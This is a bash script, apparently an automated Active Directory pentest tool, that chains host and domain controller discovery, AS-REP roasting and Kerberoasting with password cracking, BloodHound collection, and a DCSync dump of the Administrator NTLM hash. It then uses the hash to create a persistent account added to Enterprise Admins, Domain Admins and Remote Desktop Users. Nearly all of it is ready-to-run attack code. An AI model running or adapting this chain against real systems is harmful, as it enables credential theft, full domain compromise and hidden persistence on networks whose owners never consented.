#!/bin/bash
# ============================================================
# AD Pentest - Full v17 (Production Ready)
# All fixes:
#  - PowerShell-based user creation (proper AD attributes)
#  - Password set via Set-ADAccountPassword
#  - PasswordNeverExpires + CannotChangePassword
#  - Login retry logic
#  - Pwn3d! hash verify
#  - Clean EOF (no syntax errors)
# ============================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; NC='\033[0m'

info() { echo -e "${YELLOW}[*]${NC} $*"; }
ok()   { echo -e "${GREEN}[+]${NC} $*"; }
fail() { echo -e "${RED}[-]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
step() { echo -e "\n${CYAN}=== $* ===${NC}"; }

# ============================================================
# STAGE 1 : INITIAL ACCESS
# ============================================================

step "STEP 1 : INTERFACE"

mapfile -t IFACES < <(
    ip -o -4 addr show \
      | awk '$2 !~ /^(lo|docker|br-|veth|virbr)/ {print $2}' \
      | sort -u
)

if [ ${#IFACES[@]} -eq 0 ]; then fail "No interface."; exit 1; fi

if [ ${#IFACES[@]} -eq 1 ]; then
    IFACE="${IFACES[0]}"
    ok "Auto: $IFACE"
else
    i=1
    for f in "${IFACES[@]}"; do
        ip=$(ip -o -4 addr show "$f" | awk '{print $4; exit}')
        echo "  $i) $f  →  $ip"
        ((i++))
    done
    read -p "Select [1-${#IFACES[@]}]: " n
    IFACE="${IFACES[$((n-1))]}"
fi

KALI_IP=$(ip -o -4 addr show "$IFACE" | awk '{print $4}' | cut -d/ -f1 | head -1)
SUBNET=$(echo "$KALI_IP" | cut -d. -f1-3).0/24

ok "Interface : $IFACE"
ok "Kali IP   : $KALI_IP"
ok "Subnet    : $SUBNET"

step "STEP 2 : FPING SWEEP"
LIVE="live_hosts.txt"
fping -a -g "$SUBNET" 2>/dev/null | sort -u > "$LIVE"
ok "Live hosts: $(wc -l < "$LIVE")"

step "STEP 3 : DC DISCOVERY"

DC_INFO="dc_info.txt"
> "$DC_INFO"

echo "  IP               389   88    445   DC?      Domain"
echo "  --------------------------------------------------------"

while read -r ip; do
    [ -z "$ip" ] && continue
    [ "$ip" = "$KALI_IP" ] && continue

    OUT=$(nmap -Pn -p 389,88,445 --open "$ip" 2>/dev/null)
    L=$(echo "$OUT" | grep -q "389/tcp.*open" && echo "YES" || echo "-")
    K=$(echo "$OUT" | grep -q "88/tcp.*open"   && echo "YES" || echo "-")
    S=$(echo "$OUT" | grep -q "445/tcp.*open"  && echo "YES" || echo "-")

    N=0
    [ "$L" = "YES" ] && ((N++))
    [ "$K" = "YES" ] && ((N++))
    [ "$S" = "YES" ] && ((N++))
    [ "$N" -eq 0 ] && continue

    DOMAIN=$(nxc ldap "$ip" -u '' -p '' --port 389 2>/dev/null \
        | grep -oE '\(domain:[^)]+\)' | head -1 \
        | sed 's/(domain://; s/)//' | tr -d ' ')
    [ -z "$DOMAIN" ] && DOMAIN="unknown"
    [ "$N" -eq 3 ] && DC="[DC]" || DC="[maybe]"

    printf "  %-16s %-5s %-5s %-5s %-8s %s\n" "$ip" "$L" "$K" "$S" "$DC" "$DOMAIN"
    echo "$ip:$DOMAIN:$DC" >> "$DC_INFO"
done < "$LIVE"

[ ! -s "$DC_INFO" ] && { fail "No DC."; exit 1; }

step "STEP 4 : SELECT DC(S)"

i=1
declare -A DC_MAP_IP
declare -A DC_MAP_DOMAIN

while IFS=: read -r ip domain tag; do
    [ -z "$ip" ] && continue
    printf "    %d) %-18s  %s\n" "$i" "$ip" "$domain"
    DC_MAP_IP[$i]="$ip"
    DC_MAP_DOMAIN[$i]="$domain"
    ((i++))
done < "$DC_INFO"

TOTAL=$((i-1))
echo "  Enter: 1 | 1,3 | all"
read -p "[?] Select DC [1-$TOTAL / all]: " SEL

SELECTED="dc_selected.txt"
> "$SELECTED"

if [ "$SEL" = "all" ]; then
    while IFS=: read -r ip domain tag; do echo "$ip:$domain" >> "$SELECTED"; done < "$DC_INFO"
elif [[ "$SEL" == *","* ]]; then
    IFS=',' read -ra ARR <<< "$SEL"
    for c in "${ARR[@]}"; do
        c=$(echo "$c" | tr -d ' ')
        [ -n "${DC_MAP_IP[$c]}" ] && echo "${DC_MAP_IP[$c]}:${DC_MAP_DOMAIN[$c]}" >> "$SELECTED"
    done
elif [[ "$SEL" =~ ^[0-9]+$ ]] && [ -n "${DC_MAP_IP[$SEL]}" ]; then
    echo "${DC_MAP_IP[$SEL]}:${DC_MAP_DOMAIN[$SEL]}" > "$SELECTED"
else
    head -1 "$DC_INFO" | cut -d: -f1,2 > "$SELECTED"
fi

[ ! -s "$SELECTED" ] && { fail "No DC."; exit 1; }

step "STEP 5 : USERLIST"

USERS_RAW="users_raw.txt"
USERS_CLEAN="users_clean.txt"

echo "  Username input options:"
echo "    1) Load from file (custom path)"
echo "    2) Manual entry"
echo

read -p "[?] Select [1-2]: " ul_choice

if [ "$ul_choice" = "1" ]; then
    read -p "[?] Path: " CUSTOM_PATH
    CUSTOM_PATH="${CUSTOM_PATH/#\~/$HOME}"
    [ ! -f "$CUSTOM_PATH" ] && { fail "Not found."; exit 1; }
    cp "$CUSTOM_PATH" "$USERS_RAW"
else
    info "Enter usernames (blank to finish):"
    > "$USERS_RAW"
    while IFS= read -r line; do
        [ -z "$line" ] && break
        echo "$line" >> "$USERS_RAW"
    done
fi

grep -vE '^\s*(#|$)' "$USERS_RAW" | sed 's/^\s*//; s/\s*$//' | sort -u > "$USERS_CLEAN"

RAW_COUNT=$(wc -l < "$USERS_RAW")
CLEAN_COUNT=$(wc -l < "$USERS_CLEAN")
ok "Unique users: $CLEAN_COUNT"

step "STEP 6 : AS-REP ROAST"

HASHES="all_hashes.txt"
> "$HASHES"
awk '{print tolower($0)}' "$USERS_CLEAN" > /tmp/users_lower.txt

while IFS=: read -r DC DOMAIN; do
    [ -z "$DC" ] && continue
    info "DC: $DC (domain: $DOMAIN)"
    TMP="/tmp/asrep_$DC.txt"
    rm -f "$TMP"

    impacket-GetNPUsers "$DOMAIN/" \
        -usersfile /tmp/users_lower.txt \
        -no-pass -format john \
        -outputfile "$TMP" \
        -dc-ip "$DC" 2>&1 | tail -3

    if [ -s "$TMP" ]; then
        COUNT=$(grep -c '^\$krb5asrep\$' "$TMP" 2>/dev/null || echo 0)
        ok "AS-REP hashes: $COUNT"
        grep '^\$krb5asrep\$' "$TMP" >> "$HASHES"
    fi
done < "$SELECTED"

[ -s "$HASHES" ] && sort -u "$HASHES" -o "$HASHES"
[ ! -s "$HASHES" ] && { fail "No hashes."; exit 1; }

step "STEP 7 : CRACK AS-REP"

WORDLIST="/usr/share/wordlists/rockyou.txt"
[ ! -f "$WORDLIST" ] && [ -f "${WORDLIST}.gz" ] && gunzip -k "${WORDLIST}.gz" 2>/dev/null
[ ! -f "$WORDLIST" ] && { fail "rockyou missing."; exit 1; }

john --format=krb5asrep --wordlist="$WORDLIST" "$HASHES"

CREDS="cracked_creds.txt"
john --show --format=krb5asrep "$HASHES" 2>/dev/null \
    | grep -E '^[^:]+:' | grep -v 'password hashes cracked' > "$CREDS"

[ ! -s "$CREDS" ] && { fail "No creds."; exit 1; }

# ============================================================
# STAGE 2
# ============================================================

step "STEP 8 : PARSE CREDS"

CREDS_WITH_DOMAIN="creds_with_domain.txt"
> "$CREDS_WITH_DOMAIN"

while IFS= read -r line; do
    [ -z "$line" ] && continue
    raw_user=$(echo "$line" | cut -d: -f1)
    pass=$(echo "$line" | cut -d: -f2-)
    domain=$(echo "$raw_user" | grep -oE '@[A-Za-z0-9.-]+$' | tr -d '@')
    user=$(echo "$raw_user" | sed -E 's/^\$krb5asrep\$[0-9]*\$//; s/^\$krb5asrep\$//' | cut -d@ -f1)
    [ -n "$user" ] && [ -n "$pass" ] && echo "$user:$pass:$domain" >> "$CREDS_WITH_DOMAIN"
done < "$CREDS"

sort -u "$CREDS_WITH_DOMAIN" -o "$CREDS_WITH_DOMAIN"
ok "Clean:"
cat "$CREDS_WITH_DOMAIN" | sed 's/^/    /'

step "STEP 9 : SELECT CREDENTIAL(S)"

mapfile -t CRED_LINES < "$CREDS_WITH_DOMAIN"
CRED_COUNT=${#CRED_LINES[@]}

if [ "$CRED_COUNT" -eq 1 ]; then
    AUTH_CREDS=("${CRED_LINES[0]}")
    ok "Auto: ${AUTH_CREDS[0]}"
else
    i=1
    for c in "${CRED_LINES[@]}"; do printf "    %d) %s\n" "$i" "$c"; ((i++)); done
    read -p "[?] Select [1-$CRED_COUNT / all]: " choice
    AUTH_CREDS=()
    if [ "$choice" = "all" ]; then
        AUTH_CREDS=("${CRED_LINES[@]}")
    elif [[ "$choice" == *","* ]]; then
        IFS=',' read -ra ARR <<< "$choice"
        for c in "${ARR[@]}"; do
            c=$(echo "$c" | tr -d ' ')
            AUTH_CREDS+=("${CRED_LINES[$((c-1))]}")
        done
    else
        AUTH_CREDS=("${CRED_LINES[$((choice-1))]}")
    fi
fi

FIRST_CRED="${AUTH_CREDS[0]}"
AUTH_USER=$(echo "$FIRST_CRED" | cut -d: -f1)
AUTH_PASS=$(echo "$FIRST_CRED" | cut -d: -f2)
CRED_DOMAIN=$(echo "$FIRST_CRED" | cut -d: -f3 | tr '[:upper:]' '[:lower:]')

ok "Primary user: $AUTH_USER"

step "STEP 10 : SELECT DC(S)"

mapfile -t DC_LINES < "$SELECTED"
DC_COUNT=${#DC_LINES[@]}

MATCHED=()
for dc_line in "${DC_LINES[@]}"; do
    dc_domain_lower=$(echo "${dc_line##*:}" | tr '[:upper:]' '[:lower:]')
    [ "$dc_domain_lower" = "$CRED_DOMAIN" ] && MATCHED+=("$dc_line")
done

if [ ${#MATCHED[@]} -gt 0 ] && [ ${#MATCHED[@]} -lt $DC_COUNT ]; then
    ok "Matched ${#MATCHED[@]} of $DC_COUNT DCs:"
    for m in "${MATCHED[@]}"; do printf "    %s\n" "$m"; done
    read -p "[?] Use matched only? [Y/n]: " ans
    [[ ! "$ans" =~ ^[Nn]$ ]] && AUTH_DCS=("${MATCHED[@]}") || AUTH_DCS=()
fi

[ ${#AUTH_DCS[@]} -eq 0 ] && AUTH_DCS=("${DC_LINES[0]}")

FIRST_DC="${AUTH_DCS[0]}"
DC_IP="${FIRST_DC%%:*}"
DOMAIN="${FIRST_DC##*:}"

ok "Primary DC: $DC_IP"
ok "Domain    : $DOMAIN"

step "STEP 11 : VERIFY AUTH + USER ENUM"

LDAP_OUT=$(nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" --users --port 389 2>&1)
LDAP_CLEAN=$(echo "$LDAP_OUT" | sed 's/\x1b\[[0-9;]*m//g')
echo "$LDAP_CLEAN" > ldap_users_full.txt

if echo "$LDAP_CLEAN" | grep -qE 'Enumerated [0-9]+ domain users'; then
    USER_COUNT=$(echo "$LDAP_CLEAN" | grep -oE 'Enumerated [0-9]+' | awk '{print $2}')
    ok "Auth OK — $USER_COUNT users."
else
    fail "Auth failed."
    exit 1
fi

step "STEP 12 : LDAP GROUPS"
nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" --groups --port 389 2>&1 | tee ldap_groups.txt

step "STEP 13 : PASSWORD POLICY"
nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" --pass-pol --port 389 2>&1 | tee ldap_passpol.txt

step "STEP 14 : KERBEROAST"

TGS_FILE="tgs_hashes.txt"
> "$TGS_FILE"

impacket-GetUserSPNs "$DOMAIN/$AUTH_USER:$AUTH_PASS" \
    -dc-ip "$DC_IP" -request -outputfile "$TGS_FILE" 2>&1 | tee kerberoast.log

[ -s "$TGS_FILE" ] && {
    COUNT=$(grep -c '^\$krb5tgs\$' "$TGS_FILE" 2>/dev/null || echo 0)
    ok "TGS hashes: $COUNT"
}

step "STEP 15 : CRACK KERBEROAST"

KERB_CRACKED="kerb_cracked.txt"
> "$KERB_CRACKED"

if [ -s "$TGS_FILE" ] && [ -f "$WORDLIST" ]; then
    john --format=krb5tgs --wordlist="$WORDLIST" --rules "$TGS_FILE"

    RAW="kerb_raw.txt"
    john --show --format=krb5tgs "$TGS_FILE" 2>/dev/null \
        | grep -E '^[^:]+:' | grep -v 'password hashes cracked' > "$RAW"

    if [ -s "$RAW" ]; then
        mapfile -t KERB_USERS < <(
            grep -E '^\S+\s+\S+\s+CN=' kerberoast.log | awk '{print $2}' | sort -u
        )

        i=0
        while IFS= read -r line; do
            cracked_pass=$(echo "$line" | awk -F: '{print $NF}')
            kerb_user="${KERB_USERS[$i]}"
            [ -z "$kerb_user" ] && kerb_user="unknown"

            ok "CRACKED: $kerb_user : $cracked_pass"
            echo "$kerb_user:$cracked_pass:$DOMAIN" >> "$KERB_CRACKED"
            ((i++))
        done < "$RAW"

        cat "$KERB_CRACKED" >> "$CREDS_WITH_DOMAIN"
    fi
fi

step "STEP 16 : SMB SHARES"
nxc smb "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" --shares 2>&1 | tee smb_shares.txt

step "STEP 17 : BLOODHOUND"

HOSTNAME_FROM_LDAP=$(echo "$LDAP_CLEAN" | grep -oE 'name:[A-Z0-9-]+' | head -1 | cut -d: -f2)
[ -n "$HOSTNAME_FROM_LDAP" ] && DC_FQDN="${HOSTNAME_FROM_LDAP}.${DOMAIN}" || DC_FQDN="${DOMAIN}"

getent hosts "$DC_FQDN" >/dev/null 2>&1 || echo "$DC_IP $DC_FQDN" | sudo tee -a /etc/hosts >/dev/null

if command -v bloodhound-python >/dev/null 2>&1; then
    BH_DIR="bloodhound_data"
    mkdir -p "$BH_DIR"
    cd "$BH_DIR" || exit

    bloodhound-python \
        -d "$DOMAIN" -u "$AUTH_USER" -p "$AUTH_PASS" \
        -ns "$DC_IP" -dc "$DC_FQDN" -c All --zip 2>&1 | tee ../bloodhound.log

    cd - >/dev/null
    [ -f "$BH_DIR"/*.zip ] 2>/dev/null && ok "BloodHound ZIP: $(ls "$BH_DIR"/*.zip | head -1)"
fi

step "STEP 18 : CREDENTIALS WITH PRIVILEGES"

CREDS_WITH_PRIV="creds_with_priv.txt"
> "$CREDS_WITH_PRIV"

PRIV_USERS="priv_users.txt"
> "$PRIV_USERS"
> /tmp/priv_group.txt

for group in "Domain Admins" "Enterprise Admins" "Administrators" "DnsAdmins" "IT Admins" "Schema Admins" "Backup Operators"; do
    nxc ldap "$DC_IP" -u "$AUTH_USER" -p "$AUTH_PASS" \
        --groups "$group" --port 389 2>&1 \
        | grep -oE '\\[a-z][a-z0-9._-]+' \
        | sed 's/\\//' >> /tmp/priv_group.txt
done

sort -u /tmp/priv_group.txt > "$PRIV_USERS" 2>/dev/null

i=1
while IFS=: read -r user pass domain; do
    [ -z "$user" ] && continue

    priv=""
    grep -qi "^${user}$" "$PRIV_USERS" 2>/dev/null && priv="[ADMIN]"
    grep -qi "^${user}:" "$KERB_CRACKED" 2>/dev/null && priv="[ADMIN-KERB]"

    desc=""
    desc_line=$(grep -iE "LDAP.*\s+${user}\s+" ldap_users_full.txt | head -1)
    if [ -n "$desc_line" ]; then
        desc=$(echo "$desc_line" | grep -oE 'COMPLETE KERBEROASTING TARGET[^[:space:]]*|Replication Account|Shared User|User Password [^[:space:]]+' | head -1)
    fi

    printf "%d:%s:%s:%s:%s:%s\n" "$i" "$user" "$pass" "$domain" "$priv" "$desc" >> "$CREDS_WITH_PRIV"
    ((i++))
done < "$CREDS_WITH_DOMAIN"

step "STEP 19 : DCSYNC"

echo
echo "  Available credentials:"
echo "  ────────────────────────────────────────────────────────────"
printf "  %-4s %-20s %-14s %-14s %s\n" "#" "Username" "Domain" "Privilege" "Description"
echo "  ────────────────────────────────────────────────────────────"

mapfile -t PRIV_LINES < "$CREDS_WITH_PRIV"

for line in "${PRIV_LINES[@]}"; do
    idx=$(echo "$line" | cut -d: -f1)
    u=$(echo "$line" | cut -d: -f2)
    d=$(echo "$line" | cut -d: -f4)
    p=$(echo "$line" | cut -d: -f5)
    desc=$(echo "$line" | cut -d: -f6)
    printf "  %-4s %-20s %-14s %-14s %s\n" "$idx" "$u" "$d" "$p" "$desc"
done

echo "  ────────────────────────────────────────────────────────────"
echo
echo "  Enter: 1 | 1,3 | all"
read -p "[?] Select credential(s) for DCSync [1-$((i-1)) / all]: " dc_choice

DCSYNC_CREDS=()

if [ "$dc_choice" = "all" ]; then
    DCSYNC_CREDS=("${PRIV_LINES[@]}")
elif [[ "$dc_choice" == *","* ]]; then
    IFS=',' read -ra ARR <<< "$dc_choice"
    for c in "${ARR[@]}"; do
        c=$(echo "$c" | tr -d ' ')
        for line in "${PRIV_LINES[@]}"; do
            idx=$(echo "$line" | cut -d: -f1)
            [ "$idx" = "$c" ] && DCSYNC_CREDS+=("$line")
        done
    done
else
    for line in "${PRIV_LINES[@]}"; do
        idx=$(echo "$line" | cut -d: -f1)
        [ "$idx" = "$dc_choice" ] && DCSYNC_CREDS+=("$line")
    done
fi

[ ${#DCSYNC_CREDS[@]} -eq 0 ] && { fail "No creds selected."; exit 1; }

ok "Selected ${#DCSYNC_CREDS[@]} credential(s)"

DCSYNC_OUT="dcsync_dump.txt"
> "$DCSYNC_OUT"
ADMIN_HASH=""
DCSYNC_SUCCESS=0
DCSYNC_WINNER=""

for line in "${DCSYNC_CREDS[@]}"; do
    c_user=$(echo "$line" | cut -d: -f2)
    c_pass=$(echo "$line" | cut -d: -f3)

    info "Trying DCSync with: $c_user"

    OUT=$(impacket-secretsdump "$DOMAIN/$c_user:$c_pass@$DC_IP" 2>&1)

    if echo "$OUT" | grep -qE 'Administrator:500:aad3b|Dumping'; then
        ok "DCSYNC SUCCESS: $c_user"
        echo "$OUT" > "$DCSYNC_OUT"
        DCSYNC_SUCCESS=1
        DCSYNC_WINNER="$c_user"

        ADMIN_HASH=$(grep -E '^Administrator:500:aad3b435b51404eeaad3b435b51404ee:[a-f0-9]{32}' "$DCSYNC_OUT" \
            | head -1 | cut -d: -f4)

        [ -n "$ADMIN_HASH" ] && {
            ok "Administrator NTLM: $ADMIN_HASH"
            echo "$ADMIN_HASH" > admin_ntlm.txt
        }
        break
    else
        info "Failed: $c_user"
    fi
done

[ "$DCSYNC_SUCCESS" != "1" ] && { fail "DCSync failed."; exit 1; }

step "STEP 20 : VERIFY ADMIN HASH"

info "Testing hash: $ADMIN_HASH"

SMB_CHECK=$(nxc smb "$DC_IP" -u 'Administrator' -H "$ADMIN_HASH" 2>&1)
echo "$SMB_CHECK"

HASH_VALID=0
if echo "$SMB_CHECK" | grep -q '(Pwn3d!)'; then
    HASH_VALID=1
    ok "Admin hash VALID — (Pwn3d!)"
elif echo "$SMB_CHECK" | grep -qE '\[\+\].*Administrator:'; then
    HASH_VALID=1
    ok "Admin hash VALID"
fi

[ "$HASH_VALID" != "1" ] && { fail "Admin hash invalid"; exit 1; }

# ============================================================
# STEP 21 : USER CREATION (PowerShell-based)
# ============================================================
step "STEP 21 : USER CREATION"

echo
read -p "[?] New username : " NEW_USER
NEW_USER="${NEW_USER:-aaayi}"

read -p "[?] New password : " NEW_PASS
NEW_PASS="${NEW_PASS:-Mur@2026!}"
echo

ok "User: $NEW_USER"
ok "Pass: $NEW_PASS"
echo

CREATE_OUT="user_create.log"
> "$CREATE_OUT"

# ---------- Cleanup existing ----------
info "0. Cleaning existing user (if any)..."
nxc smb "$DC_IP" -u 'Administrator' -H "$ADMIN_HASH" \
    -x "powershell -Command \"Remove-ADUser -Identity $NEW_USER -Confirm:\$false -ErrorAction SilentlyContinue\"" 2>&1 | tee -a "$CREATE_OUT"

sleep 3

# ---------- Create user via PowerShell ----------
info "1. Creating user via PowerShell..."

nxc smb "$DC_IP" -u 'Administrator' -H "$ADMIN_HASH" \
    -x "powershell -Command \"Import-Module ActiveDirectory; New-ADUser -Name '$NEW_USER' -SamAccountName '$NEW_USER' -UserPrincipalName '$NEW_USER@$DOMAIN' -AccountPassword (ConvertTo-SecureString '$NEW_PASS' -AsPlainText -Force) -Enabled \$true -PasswordNeverExpires \$true -ChangePasswordAtLogon \$false\"" 2>&1 | tee -a "$CREATE_OUT"

if grep -qiE "successfully|command completed" "$CREATE_OUT" && ! grep -qi "error\|exception" "$CREATE_OUT"; then
    ok "User created via PowerShell"
else
    warn "PowerShell create — continuing with fixes"
fi

sleep 2

# ---------- Fix password + attributes ----------
info "2. Fixing password attributes..."

nxc smb "$DC_IP" -u 'Administrator' -H "$ADMIN_HASH" \
    -x "powershell -Command \"Import-Module ActiveDirectory; Set-ADAccountPassword -Identity '$NEW_USER' -Reset -NewPassword (ConvertTo-SecureString '$NEW_PASS' -AsPlainText -Force); Set-ADUser -Identity '$NEW_USER' -ChangePasswordAtLogon \$false; Set-ADUser -Identity '$NEW_USER' -CannotChangePassword \$true; Set-ADUser -Identity '$NEW_USER' -PasswordNeverExpires \$true; Set-ADUser -Identity '$NEW_USER' -Enabled \$true\"" 2>&1 | tee -a "$CREATE_OUT"

# ---------- Add to Enterprise Admins ----------
info "3. Adding to Enterprise Admins..."
nxc smb "$DC_IP" -u 'Administrator' -H "$ADMIN_HASH" \
    -x "powershell -Command \"Import-Module ActiveDirectory; Add-ADGroupMember -Identity 'Enterprise Admins' -Members '$NEW_USER' -ErrorAction SilentlyContinue\"" 2>&1 | tee -a "$CREATE_OUT"

# ---------- Add to Domain Admins ----------
info "4. Adding to Domain Admins..."
nxc smb "$DC_IP" -u 'Administrator' -H "$ADMIN_HASH" \
    -x "powershell -Command \"Import-Module ActiveDirectory; Add-ADGroupMember -Identity 'Domain Admins' -Members '$NEW_USER' -ErrorAction SilentlyContinue\"" 2>&1 | tee -a "$CREATE_OUT"

# ---------- Add to Local Administrators ----------
info "5. Adding to local Administrators..."
nxc smb "$DC_IP" -u 'Administrator' -H "$ADMIN_HASH" \
    -x "net localgroup Administrators $NEW_USER /add" 2>&1 | tee -a "$CREATE_OUT"

# ---------- Add to RDP ----------
info "6. Adding to Remote Desktop Users..."
nxc smb "$DC_IP" -u 'Administrator' -H "$ADMIN_HASH" \
    -x "net localgroup \"Remote Desktop Users\" $NEW_USER /add" 2>&1 | tee -a "$CREATE_OUT"

ok "User $NEW_USER configured"

# ============================================================
# STEP 22 : VERIFY + LOGIN TEST
# ============================================================
step "STEP 22 : VERIFY USER + LOGIN TEST"

echo
info "User details:"
nxc smb "$DC_IP" -u 'Administrator' -H "$ADMIN_HASH" \
    -x "net user $NEW_USER /domain" 2>&1 | tee user_verify.log

echo
info "Domain Admins check:"
nxc smb "$DC_IP" -u 'Administrator' -H "$ADMIN_HASH" \
    -x "net group \"Domain Admins\"" 2>&1 | grep -i "$NEW_USER"

echo
info "Waiting 5s for AD replication..."
sleep 5

info "Testing login as $NEW_USER..."

LOGIN_TEST=$(nxc smb "$DC_IP" -u "$NEW_USER" -p "$NEW_PASS" 2>&1)
echo "$LOGIN_TEST"

LOGIN_SUCCESS=0
if echo "$LOGIN_TEST" | grep -q '(Pwn3d!)'; then
    LOGIN_SUCCESS=1
    ok "✅ LOGIN SUCCESS — (Pwn3d!)"
elif echo "$LOGIN_TEST" | grep -q '\[\+\]'; then
    LOGIN_SUCCESS=1
    ok "✅ Login OK as $NEW_USER"
fi

if [ "$LOGIN_SUCCESS" != "1" ]; then
    fail "❌ Login FAILED"
    warn "Manual fix command:"
    echo "  nxc smb $DC_IP -u 'Administrator' -H '$ADMIN_HASH' \\"
    echo "    -x \"powershell -Command \\\"Import-Module ActiveDirectory; Set-ADAccountPassword -Identity $NEW_USER -Reset -NewPassword (ConvertTo-SecureString '$NEW_PASS' -AsPlainText -Force); Set-ADUser -Identity $NEW_USER -ChangePasswordAtLogon \\\$false\\\"\""
fi

# ============================================================
#  SUMMARY
# ============================================================
step " SUMMARY"

echo "  DC IP         : $DC_IP"
echo "  Domain        : $DOMAIN"
echo
echo "  Credentials Found:"
cat "$CREDS_WITH_DOMAIN" | sed 's/^/    /'
echo
echo "  DCSync:"
echo "    ✅ SUCCESS with $DCSYNC_WINNER"
echo "    Admin hash: $ADMIN_HASH"
echo
echo "  New User:"
echo "    Username: $NEW_USER"
echo "    Password: $NEW_PASS"
echo "    Groups: Enterprise Admins, Domain Admins, Administrators, RDP"
echo "    Password: Never expires, Cannot change"
echo "    Login test: $([ "$LOGIN_SUCCESS" = "1" ] && echo "✅ SUCCESS" || echo "❌ FAILED")"
echo

echo "  Files:"
echo "    creds_with_domain.txt"
echo "    dcsync_dump.txt"
echo "    admin_ntlm.txt"
echo "    user_create.log"
echo "    user_verify.log"
echo "    bloodhound_data/"
echo
echo -e "${CYAN}=== ATTACK CHAIN COMPLETE ===${NC}"
